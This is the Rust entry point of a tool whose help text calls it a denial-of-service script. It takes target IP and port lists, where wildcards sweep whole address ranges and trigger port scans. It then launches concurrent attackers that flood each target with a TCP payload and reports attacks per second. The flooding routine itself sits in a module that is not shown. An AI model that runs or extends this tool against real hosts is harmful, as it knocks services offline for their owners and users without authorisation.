use crate::dos::Attacker;
use crate::rust_scan::port_strategy::SerialRange;
use crate::rust_scan::{PortRange, PortStrategy, ScanOrder};
use crate::args::*;
use futures::prelude::*;
use rust_scan::Scanner;
use std::borrow::BorrowMut;
use std::net::*;
use std::net::{IpAddr, Ipv4Addr};
use std::sync::Arc;
use std::thread::sleep;
use std::time::Duration;
use std::{io, thread, time};
use atomic_counter::*;
use futures::stream::FuturesUnordered;
use rayon::prelude::*;

#[macro_use]
extern crate tokio;

////////////////////////////////////////////////////////////////////////////////////////////////////
// Rust Scan

#[macro_use]
extern crate log;
////////////////////////////////////////////////////////////////////////////////////////////////////

mod dos;
mod rust_scan;
mod args;

/**
 * Prints the number of per second after "threshold" of attacks.
 */
fn print_counter(counter: Arc<dyn AtomicCounter<PrimitiveType = usize>>, threshold: usize) {
    let mut prints_done: usize = 0;
    let mut previous_time = time::SystemTime::now();
    let mut previous_count: usize = 0;
    loop {
        if counter.get() >= threshold * (prints_done + 1) {
            let val = counter.get();
            prints_done += 1;
            println!(
                "Counter: {}, attacks per second: {}",
                val,
                (val - previous_count) as f64
                    / (time::SystemTime::now()
                        .duration_since(previous_time)
                        .unwrap()
                        .as_micros() as f64
                        / 1e6)
            );

            previous_count = val;
            previous_time = time::SystemTime::now();
        }
        thread::sleep(Duration::from_millis(100));
    }
}


fn print_help() {
    println!("Denile of service script implemented in Rust.");
    println!("");
    println!("Usage: hacking_dev [IPS] ");
    println!("");
    println!("IPs:    List of IP addresses with port to attack for ");
    println!("        example: 1.1.1.1:8080,127.0.0.1:22. Numbers in the address can be ");
    println!("        replaced with a * to try all 256 variants, a * for the por means it ");
    println!("        should be scanned with RustScan. If no IP address was specified the ");
    println!("        program will not run.");
    println!("");
    println!("Options: ");
    println!("    -p | --payload              TCP message that is send to the target");
    println!("    -h | --help                 Print this text and exit.");
}

#[tokio::main(flavor = "multi_thread", worker_threads = 4)]
async fn main() {
    let args = parse_cmd_args().await;
    if args.help {
        print_help();
        return;
    }

    let attack_counter: Arc<dyn AtomicCounter<PrimitiveType = usize>> =
        Arc::new(RelaxedCounter::new(0));

    println!("Attacking addresses: {:#?}", args.addresses);
    let attackers = args.addresses.iter().map(|addr| {
        Attacker::new(
            *addr,
            args.payload.clone(),
            16,
            attack_counter.clone(),
        )
    });

    // run counter on other thread
    let counter_print = attack_counter.clone();
    let _handler = thread::spawn(move || print_counter(counter_print, 50000));

    attackers
        .clone()
        .filter(|res| res.is_err())
        .for_each(|err| println!("Error: {}", err.err().unwrap()));

    let mut handlers = attackers
        .filter(|res| res.is_ok())
        .map(|ok_att| tokio::spawn(ok_att.unwrap().run()))
        .collect::<Vec<_>>();

    let results = futures::future::join_all(handlers).await;

    for handler in results.iter() {
        match handler {
            Ok(Ok(_)) => {}
            Err(e) => {
                println!("{}", e);
            }
            Ok(Err(errs)) => {
                println!("{}", errs);
            }
        }
    }

    println!("Attacking done");
}
